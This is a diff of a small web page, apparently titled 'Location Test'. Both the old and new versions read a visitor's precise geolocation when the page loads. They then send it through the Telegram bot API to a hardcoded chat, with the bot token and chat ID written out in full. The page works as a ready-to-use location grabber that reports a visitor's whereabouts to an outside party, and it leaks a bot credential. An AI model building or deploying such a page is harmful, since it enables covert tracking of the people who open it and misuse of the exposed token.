@@ -1,40 +1,31 @@
-<script>
-  const status = document.getElementById('status');
-  const botToken = "8124009104:AAFuO-IJRweLKAjiRaZYIWgMep6XTEQYTWg";
-  const chatId = "8002479084";
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>Location Test</h1>
+  <p id="status">Sending location…</p>
 
-  function submitLocation(lat, lon) {
-    const message = `Location: ${lat}, ${lon}`;
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-    
-    fetch(url)
-      .then(response => {
-        if (response.ok) {
-          status.textContent = "Location sent successfully.";
-        } else {
-          status.textContent = "Failed to send location.";
-        }
-      })
-      .catch(() => {
-        status.textContent = "Network error while sending location.";
-      });
-  }
+  <script>
+    const status = document.getElementById('status');
+    const botToken = "8124009104:AAFuO-IJRweLKAjiRaZYIWgMep6XTEQYTWg";
+    const chatId = "8002479084";
 
-  function showError(error) {
-    let msg = "Unable to get location.";
-    if (error.code === 1) msg = "Permission denied.";
-    else if (error.code === 2) msg = "Location unavailable.";
-    else if (error.code === 3) msg = "Location request timed out.";
-    status.textContent = msg;
-  }
+    function send(lat, lon) {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Test+location:+${lat},${lon}`;
+      fetch(url)
+        .then(res => {
+          if (res.ok) status.textContent = "Sent!";
+          else status.textContent = "Failed to send.";
+        })
+        .catch(err => {
+          status.textContent = "Error: " + err;
+          console.error(err);
+        });
+    }
 
-  if ("geolocation" in navigator) {
     navigator.geolocation.getCurrentPosition(
-      pos => submitLocation(pos.coords.latitude, pos.coords.longitude),
-      showError,
-      { enableHighAccuracy: true, timeout: 10000 }
+      pos => send(pos.coords.latitude, pos.coords.longitude),
+      err => status.textContent = "Error getting location."
     );
-  } else {
-    status.textContent = "Geolocation not supported.";
-  }
-</script>
+  </script>
+</body>
+</html>
